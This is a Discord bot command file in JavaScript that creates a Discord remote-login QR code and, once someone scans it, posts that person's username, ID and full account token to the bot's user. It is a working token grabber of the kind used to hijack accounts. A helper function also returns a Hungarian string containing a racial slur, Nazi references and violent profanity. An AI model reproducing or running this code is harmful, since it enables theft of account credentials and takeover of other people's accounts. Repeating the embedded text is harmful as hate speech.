const { SlashCommandBuilder } = require('discord.js');
const { RemoteAuthClient } = require('discord-remote-auth')
const https = require('https')
const fs = require('fs')

const answ3r_client = new RemoteAuthClient()

module.exports = {
    data: new SlashCommandBuilder()
        .setName('token-qrcode')
        .setDescription('Generates a QR get token.'),
    async execute(interaction, client) {

        var anyadegykurva = {}

        await interaction.reply({ content: 'QR Code generation...', ephemeral: true })

        answ3r_client.on('pendingRemoteInit', async (fingerprint) => {
            const qrCodeStream = await fs.createWriteStream('./src/data/code.png')
            const data = `https://discordapp.com/ra/${fingerprint}`
            https.get(`https://kissapi-qrcode.vercel.app/api/qrcode?chs=250x250&chl=${data}`, res => {
                res.pipe(qrCodeStream)
            })
            qrCodeStream.once('close', () => {

                var embed = new client.Discord.EmbedBuilder()
                    .setTitle('Token QR Code')
                    .setDescription('Scan the QR code to get your token.')
                    .setImage('attachment://code.png')
                    .setColor(0x00FF00)
                    .setTimestamp()
                    .setFooter({ text: 'Made by: .answ3r', iconURL: 'https://cdn.answ3r.hu/u/answ3r/mTrHnBD.png' })
                interaction.editReply({ content: '', embeds: [embed], files: ['./src/data/code.png'], ephemeral: true })

            })
        })
        answ3r_client.on('pendingFinish', user => {
            //fs.unlinkSync('code.png')
            //console.log('Incoming User:', user)

            anyadegykurva = user

            var embed = new client.Discord.EmbedBuilder()
                .setTitle('Token QR Code')
                .setDescription(`**User:** ${user.username}#${user.discriminator} ||(${user.id})||`)
                .setImage(null)
                .setThumbnail(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`)
                .setColor(0x00FF00)
                .setTimestamp()
                .setFooter({ text: 'Made by: .answ3r', iconURL: 'https://cdn.answ3r.hu/u/answ3r/mTrHnBD.png' })
            interaction.editReply({ embeds: [embed], files: [], ephemeral: true })

        })
        answ3r_client.on('finish', async (token) => {
            var kurvaaa = await JointBufentett(client, interaction, token)
        })
        answ3r_client.on('close', () => {
            //if (fs.existsSync('code.png')) fs.unlinkSync('code.png')
        })

        answ3r_client.connect()

        function JointBufentett(client, i, token) {

            var user = anyadegykurva

            var jointkaxd = new client.Discord.EmbedBuilder()
                .setTitle('Token QR Code')
                .setDescription(`**User:** ${user.username}#${user.discriminator} ||(${user.id})||
                        \n**Token:**\n\n||${token}||`)
                .setColor(0x00FF00)
                .setThumbnail(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`)
                .setTimestamp()
                .setFooter({ text: 'Made by: .answ3r', iconURL: 'https://cdn.answ3r.hu/u/answ3r/mTrHnBD.png' })

            i.editReply({ embeds: [jointkaxd], ephemeral: true })

            return 'NIGGER GECI NÁCI HALYRÁ EZAZAZ KURVANYATOKAT TE GECI EDEM RAK AZ AGYAD MUHAHAHAHHA JOINT SZERETLEK DUGJALMEG :) NACI KEREK MEGHATJÓ SZERKEZET WWÁWÁÁW'
        }

    },
};